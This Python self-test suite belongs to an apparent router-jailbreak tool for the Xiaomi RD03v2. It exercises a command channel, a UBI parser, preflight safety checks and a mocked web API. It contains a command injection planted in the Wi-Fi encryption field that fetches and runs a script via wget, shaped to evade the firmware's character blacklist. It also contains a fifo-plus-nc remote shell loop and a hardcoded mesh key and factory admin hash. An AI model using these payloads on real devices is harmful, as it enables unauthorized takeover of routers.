#!/usr/bin/env python3
"""Self-test for everything that does not need the router.

The parts worth testing off-hardware are the ones that would waste the
one-shot if they were wrong: the command channel's framing, the bulk
transfer, and the UBI parser that turns a raw dump into "is there a spare
kernel volume".  The channel test drives a real BusyBox `ash` over a real
socket using exactly the fifo+nc pattern the stager uses on the device, so a
framing bug shows up here rather than in the middle of a live run.

    python3 selftest.py
"""

import base64
import hashlib
import hmac
import http.server
import json
import os
import shutil
import socket
import socketserver
import struct
import subprocess
import sys
import tempfile
import threading
import time
import urllib.parse

import chain
import channel
import devices
import release
import probe
import ubiparse

PASS, FAIL = [], []


def check(name, cond, detail=""):
    (PASS if cond else FAIL).append(name)
    print(f"  [{'ok' if cond else 'FAIL'}] {name}{(' -- ' + detail) if detail else ''}")


def test_profiles():
    print("\n== device profiles ==")
    profile = devices.get_profile("rd03v2")
    check("RD03v2 is the only enabled profile",
          tuple(devices.PROFILES) == ("rd03v2",))
    good = {"hardware": "RD03v2", "model": "xiaomi.router.rd03v2",
            "romversion": "2.0.28"}
    check("validated stock identity accepted",
          devices.stock_identity_error(profile, good) is None)
    check("wrong hardware rejected",
          "does not match" in devices.stock_identity_error(
              profile, {**good, "hardware": "RD23"}))
    check("untested stock ROM rejected",
          "not validated" in devices.stock_identity_error(
              profile, {**good, "romversion": "2.0.12"}))


def test_simple_installer_cli():
    import install
    print("\n== simple installer CLI ==")
    args = install.parse_args([])
    check("default command selects standard v1.11 full install",
          args.image == "standard" and args.flavour == "default"
          and args.tag == "v1.11" and args.stage == "all"
          and args.transport == "auto")
    args = install.parse_args(["nss", "--interface", "enx0", "--dry-run"])
    check("NSS selection maps to the NSS release family",
          args.image == "nss" and args.flavour == "nss")
    check("simple interface and dry-run options parse",
          args.discover == "enx0" and args.dry_run)
    args = install.parse_args(["--flavour", "nss", "--stage", "preflight"])
    check("advanced recovery arguments remain compatible",
          args.image == "nss" and args.stage == "preflight")

    root = tempfile.mkdtemp(prefix="xiaomi-transport-")
    try:
        os.makedirs(os.path.join(root, "eth0"))
        os.makedirs(os.path.join(root, "wlan0", "wireless"))
        check("wired interface detection",
              install.detect_transport("eth0", root) == "wired")
        check("Wi-Fi interface detection",
              install.detect_transport("wlan0", root) == "wifi")
    finally:
        shutil.rmtree(root, ignore_errors=True)


# ---- 1. stager rendering ----------------------------------------------------


def test_stager():
    print("\n== stager ==")
    cases = {
        "factory (open AP)": [],
        "wpa2 with a known key": [
            {"ifname": "wl0", "ssid": "MyNet", "encryption": "psk2",
             "password": "hunter22", "channel": "6"},
            {"ifname": "wl1", "ssid": "MyNet_5G", "encryption": "psk2",
             "password": "hunter22", "channel": "44"},
        ],
        "mixed / unknown": [
            {"ifname": "wl0", "ssid": "A", "encryption": "", "password": ""},
        ],
    }
    for label, restore in cases.items():
        blob = channel.build_stager("192.168.31.231", 8000, 4444, restore)
        with tempfile.NamedTemporaryFile("wb", suffix=".sh", delete=False) as fh:
            fh.write(blob)
            path = fh.name
        for shell in (["busybox", "ash"], ["dash"]):
            if not shutil.which(shell[0]):
                continue
            r = subprocess.run(shell + ["-n", path], capture_output=True, text=True)
            check(f"{label}: {' '.join(shell)} -n", r.returncode == 0,
                  r.stderr.strip())
        os.unlink(path)

    wpa = channel.build_stager("10.0.0.1", 8000, 4444, cases["wpa2 with a known key"])
    check("wpa2 case restores the captured cipher", b"encryption='psk2'" in wpa)
    check("wpa2 case restores the captured key", b"key='hunter22'" in wpa)
    open_ = channel.build_stager("10.0.0.1", 8000, 4444, [])
    check("unknown radio config falls back to an open AP",
          b"encryption='none'" in open_ and b"delete wireless.$s.key" in open_)

    exp = channel.expected_wifi(cases["wpa2 with a known key"])
    check("reconnect hint names ssid and key",
          exp[0][1] == "MyNet" and "hunter22" in exp[0][2], str(exp))


# ---- 2. command channel + bulk transfer -------------------------------------


def _fake_device(shell_port, workdir):
    """The device half of the stager's channel loop, verbatim in shape."""
    script = (
        f"cd {workdir}; "
        "while true; do "
        "  rm -f ch; mkfifo ch 2>/dev/null; "
        f"  /bin/sh < ch 2>&1 | busybox nc 127.0.0.1 {shell_port} > ch; "
        "  sleep 1; "
        "done"
    )
    return subprocess.Popen(["busybox", "sh", "-c", script],
                            stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL,
                            start_new_session=True)


def test_channel():
    print("\n== command channel ==")
    if not shutil.which("busybox"):
        check("busybox present", False, "skipping channel test")
        return
    def free_port():
        with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as probe_socket:
            probe_socket.bind(("127.0.0.1", 0))
            return probe_socket.getsockname()[1]

    sport = free_port()
    fport = free_port()
    while fport == sport:
        fport = free_port()
    workdir = tempfile.mkdtemp(prefix="rd03v2-selftest-")
    outdir = os.path.join(workdir, "out")
    os.makedirs(outdir)

    ch = channel.ShellChannel(sport)
    sink = channel.FileSink(fport, outdir)
    dev = _fake_device(sport, workdir)
    try:
        check("device dialled in", ch.wait(timeout=20))
        if not ch.connected.is_set():
            return

        rc, out = ch.run("echo hello", quiet=True)
        check("simple command", rc == 0 and out == "hello", f"rc={rc} out={out!r}")

        # in a subshell: `exit 7` on the channel shell itself would end the
        # session, which is exactly what the reconnect loop is for but not
        # what we are measuring here
        rc, out = ch.run("(exit 7)", quiet=True)
        check("exit code is carried back", rc == 7, f"rc={rc}")

        rc, out = ch.run("false", quiet=True)
        check("failing builtin reports rc=1", rc == 1, f"rc={rc}")

        rc, out = ch.run("ls /definitely-not-here 2>&1", quiet=True)
        check("stderr is captured", rc != 0 and "not" in out.lower(), out[:60])

        big = ch.run("i=0; while [ $i -lt 400 ]; do echo line-$i; i=$((i+1)); done",
                     quiet=True)[1]
        check("multi-KB output reassembles", big.count("\n") == 399
              and big.endswith("line-399"), f"{len(big)} B")

        rc, out = ch.run("printf 'a\\tb\\nc__MARK__d\\n'", quiet=True)
        check("payload that looks like a marker is not eaten",
              "c__MARK__d" in out, out[:60])

        # a fresh connection replaces the old one, as after a Wi-Fi bounce
        with ch.lock:
            ch.sock.close()
            ch.sock = None
            ch.connected.clear()
        rc, out = ch.run("echo back", timeout=60, quiet=True)
        check("survives a reconnect", rc == 0 and out == "back", f"rc={rc} out={out!r}")

        # bulk transfer, the same shape probe.pull() uses
        payload = os.urandom(3 * 1024 * 1024)
        src = os.path.join(workdir, "blob.bin")
        with open(src, "wb") as fh:
            fh.write(payload)
        cmd = (f'({{ echo "FILE blob.bin {len(payload)}"; '
               f'dd if={src} bs=65536 2>/dev/null; }} '
               f'| busybox nc 127.0.0.1 {fport}) >/dev/null 2>&1 &')
        ch.run(cmd, retries=0, quiet=True)
        name, path, got, want = sink.wait(timeout=60)
        ok = path is not None and got == want == len(payload)
        check("3 MB bulk transfer", ok, f"{got}/{want}")
        if ok:
            check("bulk transfer is byte-exact",
                  hashlib.sha256(open(path, "rb").read()).digest()
                  == hashlib.sha256(payload).digest())
    finally:
        try:
            os.killpg(os.getpgid(dev.pid), 15)
        except Exception:                                        # noqa: BLE001
            dev.kill()
        shutil.rmtree(workdir, ignore_errors=True)


# ---- 3. UBI parser ----------------------------------------------------------


def _mk_ubi(peb_size=131072, vid_off=2048, data_off=4096, volumes=None,
            stale=None, image_seq=0x5A5A5A5A):
    """Synthesise a UBI image shaped like a stock kernel partition.

    volumes: list of (vol_id, name, vol_type, payload)
    """
    volumes = volumes or []
    leb = peb_size - data_off
    pebs = []

    def ec_hdr():
        h = bytearray(64)
        h[0:4] = ubiparse.EC_MAGIC
        h[4] = 1
        h[8:16] = struct.pack(">Q", 12)
        h[16:20] = struct.pack(">I", vid_off)
        h[20:24] = struct.pack(">I", data_off)
        h[24:28] = struct.pack(">I", image_seq)
        return h

    def vid_hdr(vol_id, lnum, vol_type, data_size, used_ebs, sqnum=100):
        h = bytearray(64)
        h[0:4] = ubiparse.VID_MAGIC
        h[4] = 1
        h[5] = vol_type
        h[8:12] = struct.pack(">I", vol_id)
        h[12:16] = struct.pack(">I", lnum)
        h[20:24] = struct.pack(">I", data_size)
        h[24:28] = struct.pack(">I", used_ebs)
        h[0x28:0x30] = struct.pack(">Q", sqnum)
        return h

    def peb(vid, payload):
        b = bytearray(b"\xff" * peb_size)
        b[0:64] = ec_hdr()
        if vid is not None:
            b[vid_off:vid_off + 64] = vid
        if payload:
            b[data_off:data_off + len(payload)] = payload
        return bytes(b)

    # volume table: two identical layout PEBs, as UBI keeps
    vtbl = bytearray(ubiparse.VTBL_RECORD * ubiparse.VTBL_RECORDS)
    for vol_id, name, vol_type, payload in volumes:
        rec = bytearray(ubiparse.VTBL_RECORD)
        need = (len(payload) + leb - 1) // leb
        rec[0:4] = struct.pack(">I", need + 1)
        rec[4:8] = struct.pack(">I", 1)
        rec[12] = vol_type
        rec[14:16] = struct.pack(">H", len(name))
        rec[16:16 + len(name)] = name.encode()
        off = vol_id * ubiparse.VTBL_RECORD
        vtbl[off:off + ubiparse.VTBL_RECORD] = rec
    for _ in range(2):
        pebs.append(peb(vid_hdr(ubiparse.LAYOUT_VOL_ID, len(pebs) % 2, 1, 0, 0),
                        bytes(vtbl)))

    # stale copies first, so physical order and sqnum order disagree
    for vol_id, lnum, payload in (stale or []):
        pebs.append(peb(vid_hdr(vol_id, lnum, 1, len(payload), 1, sqnum=10),
                        payload))
    for vol_id, name, vol_type, payload in volumes:
        chunks = [payload[i:i + leb] for i in range(0, len(payload), leb)] or [b""]
        for lnum, chunk in enumerate(chunks):
            pebs.append(peb(vid_hdr(vol_id, lnum, vol_type, len(chunk), len(chunks),
                                    sqnum=1000 + lnum), chunk))
    pebs.append(peb(None, b""))          # erased-and-counted block
    pebs.append(b"\xff" * peb_size)      # never-used block
    return b"".join(pebs)


def test_ubi():
    print("\n== ubi parser ==")
    fit = bytes.fromhex("d00dfeed") + os.urandom(300000)
    other = bytes.fromhex("d00dfeed") + os.urandom(120000)
    img_bytes = _mk_ubi(volumes=[
        (0, "kernel", 2, fit),
        (1, "kernel1", 2, other),
    ])
    img = ubiparse.UbiImage(img_bytes)
    check("peb size detected", img.peb_size == 131072, str(img.peb_size))
    names = sorted(v.name for v in img.volumes.values())
    check("both volumes enumerated", names == ["kernel", "kernel1"], str(names))
    check("static payload is byte-exact", img.extract(0) == fit,
          f"{len(img.extract(0))} vs {len(fit)}")
    check("second volume is byte-exact", img.extract(1) == other)
    check("FIT magic survives", img.extract(0)[:4] == bytes.fromhex("d00dfeed"))
    check("erased blocks counted", img.empty_pebs >= 1, str(img.empty_pebs))
    check("report renders", "kernel1" in img.report())

    single = ubiparse.UbiImage(_mk_ubi(volumes=[(0, "kernel", 2, fit)]))
    check("single-volume image parses",
          [v.name for v in single.volumes.values()] == ["kernel"])

    dyn = ubiparse.UbiImage(_mk_ubi(volumes=[(0, "rootfs", 1, os.urandom(500000))]))
    check("dynamic volume enumerated",
          dyn.volumes[0].type_name == "dynamic", dyn.volumes[0].type_name)


# ---- 4. parsers used for the verdicts ---------------------------------------


PROC_MTD = """dev:    size   erasesize  name
mtd0: 00080000 00020000 "0:SBL1"
mtd10: 00080000 00020000 "0:APPSBLENV"
mtd11: 00140000 00020000 "0:APPSBL"
mtd14: 00100000 00020000 "0:ART"
mtd17: 02400000 00020000 "ubi_kernel"
mtd18: 05180000 00020000 "rootfs"
"""


def test_ubi_live_hazards():
    """The two things that bite when parsing a dump off live flash."""
    print("\n== ubi parser: live-flash hazards ==")
    old, new = b"OLD" + os.urandom(2000), b"NEW" + os.urandom(2000)
    # same lnum written twice: the higher sqnum is the current one, and it is
    # deliberately placed EARLIER in the image so physical order picks wrong
    img = ubiparse.UbiImage(_mk_ubi(volumes=[(0, "kernel", 1, new)],
                                    stale=[(0, 0, old)]))
    got = img.extract(0)[:3]
    check("newest LEB wins by sqnum, not by position", got == b"NEW", str(got))

    a = _mk_ubi(volumes=[(0, "kernel", 1, os.urandom(1000))], image_seq=0x11111111)
    b = _mk_ubi(volumes=[(0, "kernel", 1, os.urandom(1000))], image_seq=0x22222222)
    merged = ubiparse.UbiImage(a + b)
    check("two adjacent UBIs are detected", len(merged.image_seqs) == 2,
          str(sorted(merged.image_seqs)))
    check("and the report says so loudly",
          "DISTINCT image_seq" in merged.report())
    single = ubiparse.UbiImage(a)
    check("a single UBI is not flagged", "DISTINCT" not in single.report())


def test_readback_match():
    print("\n== read-back comparison ==")
    image = bytes.fromhex("d00dfeed") + os.urandom(1000)
    leb = 126976
    padded = image + b"\xff" * (leb - len(image))
    ok, why = ubiparse.matches_image(padded, image)
    check("0xff-padded volume matches its image", ok, why)
    ok, why = ubiparse.matches_image(image, image)
    check("exact-length volume matches", ok, why)
    ok, why = ubiparse.matches_image(image[:-1], image)
    check("short volume is rejected", not ok, why)
    bad = bytearray(padded)
    bad[500] ^= 0xFF
    ok, why = ubiparse.matches_image(bytes(bad), image)
    check("a flipped byte is caught with its offset",
          not ok and "offset 500" in why, why)
    bad2 = bytearray(padded)
    bad2[len(image) + 10] = 0x00
    ok, why = ubiparse.matches_image(bytes(bad2), image)
    check("dirty padding is rejected", not ok, why)


def test_real_artifact():
    """Optional: parse a genuine release artifact if one has been fetched.

        RD03V2_IMAGES=/path/to/images python3 selftest.py
    """
    d = os.environ.get("RD03V2_IMAGES")
    if not d or not os.path.isdir(d):
        return
    print("\n== real release artifact ==")
    import glob
    # Releases ship four initramfs flavours (default, -nss, -wifi, -nss-wifi), so
    # match the family rather than one exact name: `release.py --download --wifi`
    # fetches the -wifi pair, which the old exact-name globs missed.
    ubis = sorted(glob.glob(os.path.join(d, "*initramfs-factory*.ubi")))
    itbs = sorted(glob.glob(os.path.join(d, "*initramfs-uImage*.itb")))
    if not ubis:
        check("artifacts present", False, f"no *initramfs-factory*.ubi in {d}")
        return
    if not itbs:
        # The .ubi alone still exercises the parser; only the wrapped-kernel
        # comparison needs the .itb, so skip that rather than fail the run.
        print(f"  [skip] no *initramfs-uImage*.itb in {d} -- fetching the .ubi "
              f"(and the sysupgrade) is enough to install; the .itb is only used "
              f"to check that the UBI wraps it")
        itbs = None
    img = ubiparse.UbiImage(open(ubis[0], "rb").read())
    names = [v.name for v in img.volumes.values()]
    check("real ubinize image parses", names == ["kernel"], str(names))
    check("peb size read from a real image", img.peb_size == 131072,
          str(img.peb_size))
    vol = img.extract(0)
    check("kernel volume is a FIT", vol[:4] == bytes.fromhex("d00dfeed"))
    if itbs:
        ok, why = ubiparse.matches_image(vol, open(itbs[0], "rb").read())
        check("volume read-back matches the .itb it wraps", ok, why)


def test_parsers():
    print("\n== verdict parsers ==")
    m = probe.parse_proc_mtd(PROC_MTD)
    check("mtd map parsed", len(m) == 6, str(sorted(m)))
    check("ubi_kernel index/size", m["ubi_kernel"] == (17, 0x02400000, 0x20000),
          str(m.get("ubi_kernel")))
    check("names with colons survive", "0:APPSBLENV" in m)

    esmt = probe.identify_nand(
        "[    0.9] spi-nand: ESMT SPI NAND was found.\n"
        "[    0.9] Serial NAND device Manufacturer:F50D1G41LB Device Size:128 MiB")
    check("ESMT identified", any("ESMT F50D1G41LB" == h["part"] for h in esmt),
          str([h["part"] for h in esmt]))

    wb = probe.identify_nand(
        "[    0.9] Serial NAND device Manufacturer:W25N01KWZEIG\n"
        "[    0.9] Device Size:128 MiB, Page size:2048, Spare Size:64, ECC:4-bit")
    check("Winbond identified", any("W25N01KW" in h["part"] for h in wb),
          str([h["part"] for h in wb]))
    check("Winbond flagged as unsupported by v1.6",
          any("v1.6" in h["note"] for h in wb))

    raw = probe.identify_nand("spi-nand spi0.0: unknown raw ID efbe210000")
    check("raw winbond id identified", any("W25N01KW" in h["part"] for h in raw),
          str([h["part"] for h in raw]))

    check("unknown chip yields no false positive",
          probe.identify_nand("nand: device found, Manufacturer ID: 0x2c") == [])


# ---- 5. the exploit constants and the web API flow --------------------------


def test_protocol():
    print("\n== mesh protocol ==")
    # cab_meshd's own debug log prints the incoming peer's key as
    # "q38d364d..." -- i.e. the 'q' role byte replacing the first nibble pair
    # of the constant. If this ever stops matching, the handshake is wrong and
    # the one-shot would be spent on a failed auth.
    key = b"q" + chain.MESH_KEY[1:]
    check("q-variant key matches the daemon's log",
          key == b"q38d364d8ed3bd085e150211ea6b3715", key.decode())
    check("mesh key length", len(chain.MESH_KEY) == 32)

    p = chain._q_pass(b"ota0001")
    expect = base64.b64encode(
        hmac.new(key, b"ota0001", hashlib.sha256).digest())
    check("auth is base64(HMAC-SHA256(key, id))", p == expect)
    check("auth fits the type-4 pass slot at 0x10", len(p) == 44, str(len(p)))

    h = chain._hdr(4, 0xA4)
    check("header is 0x2c bytes", len(h) == chain.MESH_HDR)
    check("header carries ver/len/type",
          struct.unpack(">HHH", h[0:6]) == (0x1001, 0xA4, 4),
          str(struct.unpack(">HHH", h[0:6])))

    check("factory account hash is the shipped one",
          chain.FACTORY_ADMIN_HASH.startswith("73a1d6d0")
          and chain.FACTORY_ADMIN_HASH.endswith("fa8cdfa24")
          and len(chain.FACTORY_ADMIN_HASH) == 64)

    nonce = chain.make_nonce("aa:bb:cc:dd:ee:ff")
    check("nonce has the four fields checkNonce wants",
          len(nonce.split("_")) == 4 and nonce.startswith("0_"), nonce)


class _MiWiFi(http.server.BaseHTTPRequestHandler):
    """Just enough of the stock web API to exercise the client side."""

    state = {}

    def log_message(self, *a):
        pass

    def _json(self, obj):
        body = json.dumps(obj).encode()
        self.send_response(200)
        self.send_header("Content-Type", "application/json")
        self.send_header("Content-Length", str(len(body)))
        self.end_headers()
        self.wfile.write(body)

    def do_GET(self):
        self._route({})

    def do_POST(self):
        n = int(self.headers.get("Content-Length", 0))
        raw = self.rfile.read(n).decode()
        self._route({k: v[0] for k, v in urllib.parse.parse_qs(raw).items()})

    def _route(self, form):
        st = type(self).state
        path = self.path
        if path.endswith("api/xqsystem/init_info"):
            return self._json({"hardware": "RD03v2", "romversion": "2.0.28",
                               "inited": st["inited"], "newEncryptMode": 1,
                               "routername": "XiaoQiang",
                               "model": "xiaomi.router.rd03v2"})
        if path.endswith("api/xqsystem/login"):
            want = hashlib.sha256(
                (form.get("nonce", "") + st["account"]).encode()).hexdigest()
            if form.get("password") != want:
                return self._json({"code": 401, "msg": "bad password"})
            st["stok"] = "deadbeef" * 4
            return self._json({"code": 0, "token": st["stok"]})
        if f";stok={st.get('stok')}/" not in path:
            return self._json({"code": 401, "msg": "no session"})
        if path.endswith("api/xqsystem/router_init"):
            st["inited"] = 1
            st["ssid"] = form.get("wifi24Ssid", "")
            return self._json({"code": 0})
        if path.endswith("api/xqnetwork/get_netmode"):
            return self._json({"code": 0, "netmode": st.get("netmode", 0)})
        if path.endswith("api/xqnetwork/wifi_detail_all"):
            return self._json({"code": 0, "info": st["bands"]})
        if path.endswith("api/xqnetwork/set_wifi_without_restart"):
            idx = int(form.get("wifiIndex", "1")) - 1
            enc = form.get("encryption", "")
            # `sanitize` models a firmware where `encryption` is no longer on
            # hackCheck's exemption list -- the payload needs `"` and would be
            # dropped. That is the case plant() has to catch, because firing
            # the trigger afterwards spends the one-shot on nothing.
            if st.get("sanitize") and '"' in enc:
                return self._json({"code": 1587, "msg": "参数错误"})
            st["bands"][idx]["encryption"] = enc
            st["bands"][idx]["ssid"] = form.get("ssid", "")
            st["bands"][idx]["password"] = form.get("pwd", "")
            return self._json({"code": 0})
        return self._json({"code": 404})


def test_http_flow():
    print("\n== web api flow ==")
    _MiWiFi.state = {
        "inited": 0,
        "account": chain.FACTORY_ADMIN_HASH,
        "bands": [
            {"ifname": "wl0", "ssid": "Xiaomi_ABCD", "encryption": "none",
             "password": "", "channelInfo": {"channel": 6}},
            {"ifname": "wl1", "ssid": "Xiaomi_ABCD_5G", "encryption": "none",
             "password": "", "channelInfo": {"channel": 44}},
        ],
    }
    srv = socketserver.TCPServer(("127.0.0.1", 0), _MiWiFi)
    host = f"127.0.0.1:{srv.server_address[1]}"
    threading.Thread(target=srv.serve_forever, daemon=True).start()
    try:
        info = chain.init_info(host)
        check("init_info round-trips", info["hardware"] == "RD03v2")

        chain.initialise(host, reboot=False)
        check("router_init flips inited", _MiWiFi.state["inited"] == 1)
        check("router_init submitted the SSID only",
              _MiWiFi.state["ssid"] == "XiaoQiang")

        stok = chain.login(host, chain.FACTORY_ADMIN_HASH)
        check("login derives sha256(nonce||stored)", stok == "deadbeef" * 4)

        check("gate-open CAP state accepted",
              chain.require_cap_sink_ready(host, stok) == 0)
        _MiWiFi.state["netmode"] = 4
        try:
            chain.require_cap_sink_ready(host, stok)
            check("normal wizard CAP state refused", False)
        except chain.ChainError as e:
            check("normal wizard CAP state refused",
                  "factory-reset" in str(e).lower())
        _MiWiFi.state["netmode"] = 0

        try:
            chain.login(host, "0" * 64)
            check("wrong hash is rejected", False)
        except chain.ChainError:
            check("wrong hash is rejected", True)

        bands = chain.read_wifi(host, stok)
        check("radio config captured before the plant",
              [b["ssid"] for b in bands] == ["Xiaomi_ABCD", "Xiaomi_ABCD_5G"],
              str(bands))
        check("open AP reported as such", bands[0]["encryption"] == "none")

        chain.plant(host, stok, "192.168.31.231", 8000, bands)
        enc24 = _MiWiFi.state["bands"][0]["encryption"]
        enc5 = _MiWiFi.state["bands"][1]["encryption"]
        check("2.4G carries the fetch stage",
              enc24 == '\\" wget http://192.168.31.231:8000/s -O /tmp/x #', enc24)
        check("5G carries the exec stage", enc5 == '\\" sh /tmp/x #', enc5)
        check("SSIDs preserved through the plant",
              _MiWiFi.state["bands"][0]["ssid"] == "Xiaomi_ABCD")
        check("no hackCheck-blacklisted byte in either payload",
              not any(c in enc24 + enc5 for c in ";|$&`"))

        # if the web layer ever did filter these, plant() must refuse rather
        # than let the caller burn the one-shot on a payload that is not there
        _MiWiFi.state["sanitize"] = True
        _MiWiFi.state["bands"][0]["encryption"] = "none"
        _MiWiFi.state["bands"][1]["encryption"] = "none"
        try:
            chain.plant(host, stok, "192.168.31.231", 8000, bands)
            check("a filtered plant aborts before the trigger", False)
        except chain.ChainError as e:
            check("a filtered plant aborts before the trigger",
                  "read-back" in str(e), str(e)[:60])
    finally:
        srv.shutdown()


# ---- 6. the probe battery itself --------------------------------------------


def test_facts_commands():
    """Every FACTS command must be valid BusyBox ash and must terminate.

    A syntax error in one of these would be discovered on the router, in the
    middle of the only shot at it. Running them against the local busybox
    proves the shell accepts them; the output is this machine's, not a
    router's, which is fine -- shape is what is under test.
    """
    print("\n== probe battery ==")
    if not shutil.which("busybox"):
        check("busybox present", False, "skipping")
        return
    for key, _desc, cmd in probe.FACTS:
        # a newline inside a command would be read as its own shell line and
        # desynchronise the marker framing
        check(f"{key}: single line", "\n" not in cmd)
        r = subprocess.run(["busybox", "ash", "-c", cmd],
                           capture_output=True, text=True, timeout=30)
        bad = [ln for ln in r.stderr.splitlines()
               if "syntax error" in ln or "unexpected" in ln]
        check(f"{key}: runs under ash", not bad, "; ".join(bad[:2]))


class _FakeSink:
    def __init__(self):
        self.q = []

    def wait(self, timeout=0):
        return self.q.pop(0) if self.q else (None, None, 0, 0)


class _FakeChannel:
    """Answers pull()'s reader commands the way a device with no nanddump
    and a working dd would."""

    def __init__(self, sink, outdir, size):
        self.sink, self.outdir, self.size = sink, outdir, size
        self.cmds = []

    def run(self, cmd, timeout=0, retries=0, quiet=False):
        self.cmds.append(cmd)
        path = os.path.join(self.outdir, "ubi_kernel.bin")
        if "nanddump" in cmd:
            open(path, "wb").write(b"")                 # applet missing
            self.sink.q.append(("ubi_kernel.bin", path, 0, self.size))
        elif "dd if=" in cmd:
            open(path, "wb").write(b"\xa5" * self.size)
            self.sink.q.append(("ubi_kernel.bin", path, self.size, self.size))
        return 0, ""


def test_pull_fallback():
    outdir = tempfile.mkdtemp(prefix="rd03v2-pull-")
    try:
        size = 4096
        sink = _FakeSink()
        ch = _FakeChannel(sink, outdir, size)
        got = probe.pull(ch, sink, outdir, {"ubi_kernel": (17, size, 131072)},
                         "ubi_kernel", ["ubi_kernel"], "10.0.0.1", 4445)
        check("falls back past a missing nanddump", got is not None
              and got["reader"] == "dd", str(got and got["reader"]))
        check("records the partition it read", got and got["partition"] == "ubi_kernel")
        check("hashes what it received",
              got and got["sha256"] == hashlib.sha256(b"\xa5" * size).hexdigest())

        missing = probe.pull(ch, sink, outdir, {"rootfs": (18, 10, 1)},
                             "appsbl", ["0:APPSBL"], "10.0.0.1", 4445)
        check("absent partition is skipped, not guessed", missing is None)
    finally:
        shutil.rmtree(outdir, ignore_errors=True)


# ---- 7. the installer's pre-flight, replayed against real device output -----

# Verbatim from a live RD03v2 on stock 2.0.28 (probe-20260814-074535).
REAL_MTD = """dev:    size   erasesize  name
mtd0: 00080000 00020000 "0:SBL1"
mtd1: 00080000 00020000 "0:MIBIB"
mtd10: 00080000 00020000 "0:APPSBLENV"
mtd11: 00140000 00020000 "0:APPSBL"
mtd13: 00100000 00020000 "0:ART"
mtd15: 00080000 00020000 "bdata"
mtd18: 01e00000 00020000 "rootfs"
mtd19: 01e00000 00020000 "rootfs_1"
mtd20: 03980000 00020000 "overlay"
mtd21: 00383000 0001f000 "kernel"
mtd22: 0120b000 0001f000 "ubi_rootfs"
"""
REAL_CMDLINE = ("ubi.mtd=rootfs root=mtd:ubi_rootfs rootfstype=squashfs "
                "cnss2.bdf_integrated=0x24 rootwait swiotlb=1")


class _ReplayShell:
    """Answers the exact commands preflight() issues, with real values."""

    def __init__(self, **over):
        self.v = {
            "model": "RD03v2", "flash_type": "11", "flag_boot_rootfs": "0",
            "mtd": REAL_MTD, "cmdline": REAL_CMDLINE,
            "ubi": "ubi0 18\nubi1 20", "flag_last_success": "0",
            "df": "tmpfs                    93332      1216     92116   1% /tmp",
            "missing_tool": None,
        }
        self.v.update(over)

    def run(self, cmd, timeout=0, retries=0, quiet=False):
        if cmd.startswith("nvram get "):
            return 0, self.v.get(cmd.split()[-1], "")
        if "cat /proc/mtd" in cmd:
            return 0, self.v["mtd"]
        if "cat /proc/cmdline" in cmd:
            return 0, self.v["cmdline"]
        if "/sys/class/ubi" in cmd:
            return 0, self.v["ubi"]
        if cmd.startswith("df "):
            return 0, self.v["df"]
        if cmd.startswith("command -v "):
            tool = cmd.split()[2]
            return (1, "") if tool == self.v["missing_tool"] else (0, "")
        return 0, ""


def _fake_release(tag="v1.6"):
    return release.Release({"tag_name": tag, "published_at": "2026-08-02T00:00:00Z",
                            "assets": []})


def _fake_images(size=14680064):
    d = tempfile.mkdtemp(prefix="rd03v2-img-")
    p = os.path.join(d, "initramfs-factory.ubi")
    with open(p, "wb") as fh:
        fh.truncate(size)          # sparse: preflight only stats it
    return {"initramfs_ubi": {"name": "initramfs-factory.ubi", "path": p}}, d


def _preflight(shell, rel=None, images=None):
    import install
    imgs, d = (images, None) if images else _fake_images()
    try:
        return install.preflight(shell, rel or _fake_release(), imgs, True,
                                 devices.RD03V2), None
    except Exception as e:                                       # noqa: BLE001
        return None, e
    finally:
        if d:
            shutil.rmtree(d, ignore_errors=True)


def test_installer_preflight():
    import install
    print("\n== installer pre-flight (replaying the real unit) ==")

    m = install.parse_mtd(REAL_MTD)
    check("real /proc/mtd parses", m["rootfs_1"]["index"] == 19
          and m["rootfs"]["size"] == 0x01e00000, str(m.get("rootfs_1")))
    check("both slots are the same size",
          m["rootfs"]["size"] == m["rootfs_1"]["size"])

    facts, err = _preflight(_ReplayShell())
    check("real unit passes pre-flight", err is None, str(err))
    if facts:
        check("running slot read from cmdline", facts["running_slot"] == "rootfs")
        check("target is the idle slot", facts["target_slot"] == "rootfs_1",
              facts["target_slot"])
        check("NAND decoded from nvram flash_type",
              facts["nand"] == "ESMT F50D1G41LB", str(facts["nand"]))

    facts, err = _preflight(_ReplayShell(flash_type="be"))
    check("Winbond unit refused against v1.6",
          err is not None and "v1.7" in str(err), str(err)[:80])

    facts, err = _preflight(_ReplayShell(flash_type="be"), rel=_fake_release("v1.7"))
    check("Winbond unit accepted against v1.7", err is None, str(err)[:80])
    check("Winbond part name decoded",
          facts and facts["nand"] == "Winbond W25N01KW", str(facts and facts["nand"]))

    _f, err = _preflight(_ReplayShell(flash_type="77"))
    check("unknown flash_type fails closed",
          err is not None and "no release is known to drive it" in str(err),
          str(err)[:80])

    _f, err = _preflight(_ReplayShell(flash_type=""))
    check("absent flash_type fails closed",
          err is not None and "no flash_type" in str(err), str(err)[:80])

    _f, err = _preflight(_ReplayShell(model="RD23"))
    check("wrong model refused", err is not None and "RD03v2" in str(err))

    _f, err = _preflight(_ReplayShell(flag_boot_rootfs="1"))
    check("cmdline/flag_boot_rootfs disagreement refused",
          err is not None and "Refusing to guess" in str(err), str(err)[:80])

    # flag_last_success is the chooser's actual input, so a disagreement there
    # means the slot model is wrong -- must refuse just as hard.
    _f, err = _preflight(_ReplayShell(flag_last_success="1"))
    check("cmdline/flag_last_success disagreement refused",
          err is not None and "Refusing to guess" in str(err), str(err)[:80])

    facts, err = _preflight(_ReplayShell())
    check("flag_last_success recorded for the pivot",
          err is None and facts["flag_last_success"] == "0",
          str(facts and facts.get("flag_last_success")))

    _f, err = _preflight(_ReplayShell(ubi=""))
    check("unreadable ubi->mtd mapping fails closed",
          err is not None and "refusing to pick a target" in str(err), str(err)[:80])

    # the interlock that actually matters: never write the live partition
    _f, err = _preflight(_ReplayShell(ubi="ubi0 19\nubi1 20"))
    check("target attached at runtime is refused",
          err is not None and "not the idle slot" in str(err), str(err)[:80])

    big, d = _fake_images(size=0x01e00000 + 1)
    _f, err = _preflight(_ReplayShell(), images=big)
    shutil.rmtree(d, ignore_errors=True)
    check("oversized image refused", err is not None and "holds" in str(err),
          str(err)[:80])

    small, d = _fake_images()
    _f, err = _preflight(_ReplayShell(df="tmpfs 93332 1216 4096 96% /tmp"),
                         images=small)
    shutil.rmtree(d, ignore_errors=True)
    check("insufficient tmpfs refused", err is not None and "tmpfs" in str(err),
          str(err)[:80])

